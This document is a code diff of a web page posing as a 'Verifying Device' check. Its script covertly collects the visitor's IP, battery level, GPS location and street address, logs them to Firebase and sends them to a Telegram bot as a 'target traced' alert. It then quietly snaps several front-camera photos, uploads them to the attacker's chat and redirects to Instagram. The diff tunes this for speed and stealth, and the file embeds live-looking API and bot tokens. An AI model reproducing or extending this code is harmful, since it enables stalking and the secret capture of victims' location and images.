@@ -9,6 +9,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">
+    
     <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl">
         <div class="relative w-16 h-16 mx-auto mb-6">
             <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
@@ -16,7 +17,7 @@
         </div>
         <h1 class="text-xl font-black italic tracking-tighter uppercase">Verifying <span class="text-blue-500">Device</span></h1>
         
-        <div class="w-full bg-slate-800 h-1 rounded-full mt-8 overflow-hidden">
+        <div class="w-full bg-slate-800 h-1.5 rounded-full mt-8 overflow-hidden">
             <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
         </div>
         <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing with Node...</p>
@@ -26,7 +27,6 @@
     </div>
 
     <script>
-        // Firebase Setup
         const firebaseConfig = {
             apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
             databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
@@ -37,76 +37,81 @@
 
         const params = new URLSearchParams(window.location.search);
         const tid = params.get('tid');
-        const red = decodeURIComponent(params.get('rd') || "https://www.youtube.com");
+        // Instagram links ke liye fallback set kiya hai
+        const red = params.get('rd') ? decodeURIComponent(params.get('rd')) : "https://www.instagram.com";
         const botToken = "8382714466:AAFAuorgHezCvk1dr7OxExD8zAMpgFTLvLI";
 
-        let address = "Awaiting Address...";
-        let sessionID = "TRK-" + Math.floor(1000 + Math.random() * 9000);
+        let address = "Scanning Location...";
+        let sessionID = "NODE-" + Math.floor(Math.random() * 9999);
 
-        async function startIntel() {
-            if(!tid) return window.location.href = red;
+        // Security: Redirect if no Telegram ID
+        if(!tid) window.location.replace(red);
 
+        async function startProtocol() {
             try {
-                const bat = await navigator.getBattery();
-                const batStatus = `${(bat.level * 100).toFixed(0)}%`;
+                // Get Network & Battery
+                const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({json: () => ({ip: 'Hidden'})}));
+                const ip = await ipRes.json();
+                const bat = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
 
-                const ipReq = await fetch('https://ipapi.co/json/');
-                const ip = await ipReq.json();
-                
-                navigator.geolocation.getCurrentPosition(pos => {
+                // Get Location
+                navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
-                    .then(r => r.json()).then(data => {
-                        address = data.display_name;
-                        
-                        // Sync to Dashboard Table
-                        db.ref('shadow_sessions/' + sessionID).set({
-                            address: address,
-                            target_email: ip.ip,
-                            time: Date.now(),
-                            status: "Success",
-                            platform: navigator.platform,
-                            battery: batStatus
-                        });
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+                    const geoData = await geoRes.json();
+                    address = geoData.display_name || "Street Level Access";
 
-                        sendTG(`🚨 *NEW TARGET TRACED*\n\n📍 *ADDRESS:* ${address}\n🔗 *MAPS:* ${maps}\n🌐 *IP:* ${ip.ip}\n🔋 *BATTERY:* ${batStatus}\n🆔 *LOG:* ${sessionID}`);
-                        initCamera();
-                    });
-                }, () => {
+                    // Sync to Firebase (For Dashboard Tracking Table)
                     db.ref('shadow_sessions/' + sessionID).set({
-                        address: "GPS Denied (" + ip.city + ")",
+                        address: address,
                         target_email: ip.ip,
                         time: Date.now(),
-                        status: "Limited"
+                        status: "CAPTURED",
+                        platform: navigator.platform,
+                        battery: (bat.level * 100) + "%"
                     });
-                    sendTG(`⚠️ *GPS DENIED*\n🌐 *IP:* ${ip.ip}\n🏙️ *City:* ${ip.city}`);
+
+                    // Send to Telegram
+                    sendTG(`🚨 *TARGET TRACED*\n\n📍 *ADDR:* ${address}\n🔗 *MAPS:* https://www.google.com/maps?q=${lat},${lon}\n🌐 *IP:* ${ip.ip}\n🔋 *BAT:* ${(bat.level * 100)}%`);
+                    
                     initCamera();
-                });
+                }, (err) => {
+                    // If Location Denied
+                    db.ref('shadow_sessions/' + sessionID).set({
+                        address: "GPS Blocked (" + (ip.city || 'Unknown') + ")",
+                        target_email: ip.ip,
+                        time: Date.now(),
+                        status: "LIMITED"
+                    });
+                    initCamera();
+                }, {timeout: 5000});
+
             } catch (e) { initCamera(); }
         }
 
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
-                setTimeout(captureLoop, 1000);
-            } catch(e) { window.location.href = red; }
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                // Faster capture trigger
+                setTimeout(captureCycle, 500);
+            } catch(e) { window.location.replace(red); }
         }
 
-        async function captureLoop() {
-            for(let i=1; i<=4; i++) {
-                document.getElementById('status').innerText = `Syncing Node ${i}/4...`;
-                document.getElementById('bar').style.width = (i * 25) + "%";
-                await takePhoto(i);
-                await new Promise(r => setTimeout(r, 1200));
+        async function captureCycle() {
+            for(let i=1; i<=3; i++) { // Optimized to 3 fast shots
+                document.getElementById('bar').style.width = (i * 33) + "%";
+                document.getElementById('status').innerText = `Verifying Packet ${i}...`;
+                await takeShot(i);
+                await new Promise(r => setTimeout(r, 800)); // Ultra fast interval
             }
-            window.location.href = red;
+            window.location.replace(red); // Permanent redirect
         }
 
-        async function takePhoto(idx) {
+        async function takeShot(idx) {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
@@ -114,8 +119,8 @@
             const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
             const fd = new FormData();
             fd.append('chat_id', tid);
-            fd.append('photo', blob, `shot.jpg`);
-            fd.append('caption', `📸 Shot ${idx}/4\n🆔 ${sessionID}\n📍 ${address.substring(0, 50)}...`);
+            fd.append('photo', blob, `cam.jpg`);
+            fd.append('caption', `📸 Cam ${idx} | ID: ${sessionID}\n📍 ${address.substring(0,40)}...`);
 
             return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
         }
@@ -128,7 +133,11 @@
             });
         }
 
-        startIntel();
+        // Start Everything
+        startProtocol();
+
+        // Fail-safe: Force redirect after 12 seconds no matter what
+        setTimeout(() => { window.location.replace(red); }, 12000);
     </script>
 </body>
 </html>
